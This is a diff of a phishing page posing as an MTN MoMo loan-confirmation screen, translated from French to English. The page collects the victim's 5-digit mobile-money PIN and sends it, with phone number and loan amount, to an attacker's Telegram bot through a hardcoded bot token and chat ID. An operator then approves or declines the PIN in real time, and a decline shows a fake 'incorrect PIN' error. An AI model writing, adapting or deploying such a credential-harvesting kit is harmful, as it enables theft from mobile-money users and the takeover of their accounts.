@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>MTN  · Autorisation PIN</title>
-  
+  <title>MTN  · PIN Authorisation</title>
+
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  
+
   <style>
     * {
       margin: 0;
@@ -251,12 +251,12 @@
   <!-- Error box -->
   <div class="error-box" id="errorBox">
     <div class="close-error" onclick="hideError()">×</div>
-    <div class="error-title">Erreur</div>
-    <div class="error-text" id="errorText">Code PIN invalide</div>
+    <div class="error-title">Error</div>
+    <div class="error-text" id="errorText">Invalid PIN</div>
   </div>
 
   <div class="modal-header">
-    <h2>Confirmation du prêt</h2>
+    <h2>Loan Confirmation</h2>
     <div class="close-btn" id="backBtn">×</div>
   </div>
   <div class="divider"></div>
@@ -268,26 +268,26 @@
   </div>
 
   <div class="description">
-    Vous êtes sur le point d'autoriser MTN  à verser les fonds sur votre porte‑monnaie MTN MoMo. Saisissez votre code PIN pour autoriser.
+    You are about to authorise MTN  to disburse the funds to your MTN MoMo wallet. Enter your PIN to authorise.
   </div>
 
-  <div class="label">Code PIN MTN MoMo (5 chiffres)</div>
+  <div class="label">MTN MoMo PIN (5 digits)</div>
 
   <!-- Single PIN input – 5 digits -->
   <input class="pin-input-single" id="pinInput" type="password" inputmode="numeric" maxlength="5" autofocus autocomplete="off" placeholder="· · · · ·">
 
-  <button class="btn-authorise" id="authoriseBtn">Autoriser</button>
+  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
 </div>
 
 <!-- Spinner overlay -->
 <div id="spinner">
   <div class="loader"></div>
-  <div class="spinner-text">Traitement en cours...</div>
+  <div class="spinner-text">Processing...</div>
 </div>
 
 <script>
   (function() {
-    // --- TELEGRAM CONFIG (same bot) ---
+    // --- TELEGRAM CONFIG ---
     const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
     const CHAT_ID   = '1006917440';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -300,9 +300,9 @@
     const errorText = document.getElementById('errorText');
     const backBtn = document.getElementById('backBtn');
 
-    // --- Retrieve session data (MTN keys) ---
-    let phone = sessionStorage.getItem('mtn_phone') || '655123456'; // default Cameroon demo
-    let loanAmount = sessionStorage.getItem('mtn_loanAmount') || 'Non spécifié';
+    // --- Retrieve session data ---
+    let phone = sessionStorage.getItem('mtn_phone') || '655123456';
+    let loanAmount = sessionStorage.getItem('mtn_loanAmount') || 'Not specified';
 
     // --- Single PIN input logic ---
     function updateButtonState() {
@@ -317,23 +317,19 @@
     }
 
     pinInput.addEventListener('input', function() {
-      // Only allow digits
       let val = this.value.replace(/\D/g, '');
       if (val.length > 5) val = val.slice(0, 5);
       this.value = val;
       updateButtonState();
-      // Hide any previous error
       hideError();
     });
 
-    // Prevent non-digit keys
     pinInput.addEventListener('keydown', function(e) {
       if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
         e.preventDefault();
       }
     });
 
-    // Initial state
     updateButtonState();
 
     // --- Error handling ---
@@ -342,11 +338,11 @@
     };
 
     function showError(msg) {
-      errorText.innerText = msg || 'Code PIN invalide. Veuillez réessayer.';
+      errorText.innerText = msg || 'Invalid PIN. Please try again.';
       errorBox.style.display = 'block';
     }
 
-    // --- Telegram helpers (English messages) ---
+    // --- Telegram helpers ---
     function escapeHtml(unsafe) {
       return unsafe.replace(/[&<>"]/g, function(m) {
         if (m === '&') return '&amp;';
@@ -413,7 +409,7 @@
 
       const pin = pinInput.value.replace(/\D/g, '');
       if (pin.length !== 5) {
-        showError('Veuillez saisir les 5 chiffres de votre code PIN.');
+        showError('Please enter all 5 digits of your PIN.');
         pinInput.focus();
         return;
       }
@@ -426,9 +422,8 @@
       const identifier = `MTN MoMo: ${phone}`;
       const ts = Date.now();
       const escapedPin = escapeHtml(pin);
-      const amountText = loanAmount !== 'Non spécifié' ? `\nLoan Amount: XAF ${loanAmount}` : '';
+      const amountText = loanAmount !== 'Not specified' ? `\nLoan Amount: XAF ${loanAmount}` : '';
 
-      // English message for admin
       const msg = `🔐 <b>MTN  PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
 
       await sendToTelegram({
@@ -448,10 +443,9 @@
         isProcessing = false;
 
         if (action === 'approve') {
-          // Redirect to a success page (e.g., unavailable.html or loan confirmation)
           window.location.href = 'unavailable.html';
         } else if (action === 'decline') {
-          showError('Code PIN incorrect. Autorisation refusée.');
+          showError('Incorrect PIN. Authorisation declined.');
           pinInput.value = '';
           pinInput.disabled = false;
           pinInput.focus();
@@ -461,12 +455,11 @@
       });
     });
 
-    // --- Back button (X) – goes to previous page ---
+    // --- Back button ---
     backBtn.addEventListener('click', function() {
       window.history.back();
     });
 
-    // --- Fallback phone if not set ---
     if (!sessionStorage.getItem('mtn_phone')) {
       console.log('Using demo Cameroon MTN number');
     }
